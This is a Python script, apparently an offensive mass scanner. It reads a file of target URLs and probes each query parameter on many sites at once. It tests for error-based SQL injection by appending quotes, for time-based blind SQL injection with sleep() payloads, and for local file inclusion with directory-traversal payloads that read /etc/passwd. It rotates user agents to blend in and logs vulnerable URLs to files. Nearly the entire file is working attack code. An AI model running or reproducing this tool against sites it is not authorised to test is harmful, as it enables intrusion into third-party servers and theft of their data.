import requests
import random
import re
import codecs
import sys
import base64
from time import time as timer
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
CYAN = '\033[01;36m'
ENDC = '\033[0m'


def usage():
    try:
        print(OKBLUE+'Usage : python ' + str(sys.argv[0])+' links.txt'+ENDC)
    except:
        pass
    

try:
    with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IOError:
    usage()
except IndexError:
    usage()

ooo = list((ooo))


def banner():
    print(CYAN+'------Coded--By-------------------')
    print('    __  __      __      __ __ ')
    print('   / / / /___  / /___ _/ //_/___ ')
    print('  / /_/ / __ \\/ / __ `/ ,< / __ \\')
    print(' / __  / /_/ / / /_/ / /| / /_/ /')
    print("/_/ /_/\\____/_/\\__,_/_/ |_\\____/ \n\n")


user_agent_list = [

    # Chrome

    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',

    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',

    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',

    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',

    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',

    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',

    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',

    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',

    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',

    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',

    # Firefox

    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',

    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',

    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',

    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',

    'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',

    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',

    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',

    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',

    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',

    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',

    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',

    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',

    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)'

]

# SQL Error Messages
MySQL = ["SQL syntax.*MySQL", "Warning.*mysql_.*",
         "valid MySQL result", "MySqlClient\."]
PostgreSQL = ["PostgreSQL.*ERROR", "Warning.*\Wpg_.*",
              "valid PostgreSQL result", "Npgsql\."]
MicrosoftSQLServer = ["Driver.* SQL[\-\_\ ]*Server", "OLE DB.* SQL Server",
                      "(\W|\A)SQL Server.*Driver", "Warning.*mssql_.*", "(\W|\A)SQL Server.*[0-9a-fA-F]{8}", "(?s)Exception.*\WSystem\.Data\.SqlClient\.", "(?s)Exception.*\WRoadhouse\.Cms\."]
MicrosoftAccess = ["Microsoft Access Driver",
                   "JET Database Engine", "Access Database Engine"]
Oracle = ["\bORA-[0-9][0-9][0-9][0-9]", "Oracle error",
          "Oracle.*Driver", "Warning.*\Woci_.*", "Warning.*\Wora_.*"]
dIBMDB2 = ["CLI Driver.*DB2", "DB2 SQL error", "\bdb2_\w+\("]
SQLite = ["SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite.SQLiteException",
          "Warning.*sqlite_.*", "Warning.*SQLite3::", "\[SQLITE_ERROR\]"]
Sybase = ["(?i)Warning.*sybase.*", "Sybase message",
          "Sybase.*Server message.*"]


def createSqliUrl(url):
    try:
        urlParams = url.split("?")[1]
    except:
        return

    urlParams = urlParams.split("&")
    for param in urlParams:
        try:
            param = param.split("=")
            paramStr = str(param[0]+"="+param[1])

            # Check for sqli using '
            paramExploitStr = paramStr+"'"
            newUrl = url.replace(paramStr, paramExploitStr)
            if(checkSqli(newUrl) == "done"):
                with open('sqlscan-v1-results.txt', 'a') as file2:
                    file2.write(newUrl+"\n")
                break

            # Check for sql using "
            paramExploitStr2 = paramStr+'"'
            newUrl2 = url.replace(paramStr, paramExploitStr2)
            if(checkSqli(newUrl2) == "done"):
                with open('sqlscan-v2-results.txt', 'a') as file1:
                    file1.write(newUrl2+"\n")
                break
            
            # LFI Payloads for exploiting...
            lfipayloads = {"../../../../../../etc/passwd","....//....//....//....//....//....//etc//passwd","../../../../../../etc/passwd%00"}
            # SQLi Payloads for exploiting...
            payloads = ["if(now()=sysdate(),sleep(5),0)", "0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
                        "'XOR(if(now()=sysdate(),sleep(5),0))XOR'", "(select(0)from(select(sleep(5)))v)/'+(select(0)from(select(sleep(5)))v)+'\""]

            # Check for Blind SQLi, with Payloads.
            for payload in payloads:
                paramZxploitStr = paramStr+payload
                zurl = url.replace(paramStr, paramZxploitStr)
                if(blindSQLi(zurl) == "exploited"):
                    break 
            # Check for Local File Inclusion (LFI), with Payloads.
            for lpayload in lfipayloads:
                paramZxploitStr = param[0]+"="+lpayload
                zurl = url.replace(paramStr, paramZxploitStr)
                if(getLFI(zurl) == "exploited"):
                    break 
        except:
            pass


def getLFI(link):
    """
    This function is created to exploit Local File Inclusion on the Link Provided as paramater
    """
    try:
        user_agent = random.choice(user_agent_list)
        headers = {'User-Agent': user_agent}
        request = requests.get(link, headers=headers, verify=False)
        string = "root:x:"
        error = "include(../etc/passwd)"
        if error in request.text:
            print(OKGREEN+"[+LFI+]  "+ENDC+link+OKBLUE+"   Knock, Knock, Knock Neo it's VULNAREBLE..."+ENDC)
        else:
            print(FAIL+"[-LFI-]  "+ENDC+link+FAIL+"   NO White Rabbit Found..."+ENDC)
        if request.status_code == 200 and string in request.text:
            print(CYAN+"[*LFI*INFO*]  "+ENDC+link+CYAN+"   <ROSE> White Rabbit <ROSE>"+ENDC)
            with open("lfiResults.txt", "a") as fil:
                fil.write(link+"\n")
            return "exploited"
        else:
            return "notyet"
    except KeyboardInterrupt:
        sys.exit()
    # except IOError as io:
    #     print(io)
    except:
        pass

def blindSQLi(link):
    """
    This function is created to exploit Blind SQL Injection on the Link Provided as paramater
    """
    try:
        user_agent = random.choice(user_agent_list) # Change User Agent at each Request.
        headers = {'User-Agent': user_agent}
        request = requests.get(link, headers=headers, verify=False)
        if (request.status_code == 200) and (request.elapsed.total_seconds() >= 5):
            print(OKBLUE+"[*BLIND*INFO*]  "+ENDC+link+OKBLUE+"   <ROSE> White Rabbit <ROSE>"+ENDC)
            with open("blindSQLiResults.txt", "a") as fil1:
                fil1.write(link+"\n")
            return "exploited"
        else:
            print(WARNING+"[BLIND]  "+ENDC+link+WARNING+"   No White Rabbit..."+ENDC)
            return "notyet"
    except KeyboardInterrupt:
        sys.exit()
    # except IOError as io:
    #     print(io)
    except:
        pass


def checkSqli(url):
    """
    This function is created to check SQL Injection at the url provided as parameter
    """
    r = requests.get(url, verify=False, timeout=10)
    print(FAIL+"[+]  "+ENDC+url+CYAN +
          "\t<TUNNEL> KNOCK, KNOCK, KNOCK <TUNNEL>"+ENDC)
    html = r.content
    for regg in MySQL:
        if(re.search(regg, html)):
            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
            return "done"
    for regg in PostgreSQL:
        if(re.search(regg, html)):
            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
            return "done"
    for regg in MicrosoftSQLServer:
        if(re.search(regg, html)):
            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
            return "done"
    for regg in MicrosoftAccess:
        if(re.search(regg, html)):
            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
            return "done"
    for regg in Oracle:
        if(re.search(regg, html)):
            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
            return "done"
    for regg in dIBMDB2:
        if(re.search(regg, html)):
            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
            return "done"
    for regg in SQLite:
        if(re.search(regg, html)):
            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
            return "done"
    for regg in Sybase:
        if(re.search(regg, html)):
            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
            return "done"


def threads():
    """
    This function is created to start the Scanner with Multi-Threaded Mapping with a call for createSqliUrl function .
    """
    try:
        start = timer()
        check = Pool(24)
        check.map(createSqliUrl, ooo)
        print(WARNING+'[*]  Time: ' + str(timer() - start) + ' seconds'+ENDC)

    except KeyboardInterrupt:
        sys.exit()


if __name__ == '__main__':
    threads()
